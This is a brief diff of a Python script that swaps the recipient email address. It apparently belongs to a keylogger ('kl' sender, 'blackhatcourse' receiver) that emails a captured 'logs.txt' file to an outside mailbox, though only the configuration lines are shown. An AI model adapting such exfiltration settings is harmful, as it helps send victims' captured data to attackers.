@@ -3,7 +3,7 @@ import time
 
 sender = "kl@hckd.com"
 
-receivers = ['blackhatcourse2020@protonmail.com']
+receivers = ['shalimarbaghouse@protonmail.com']
 
 f = open("logs.txt", "r")
 
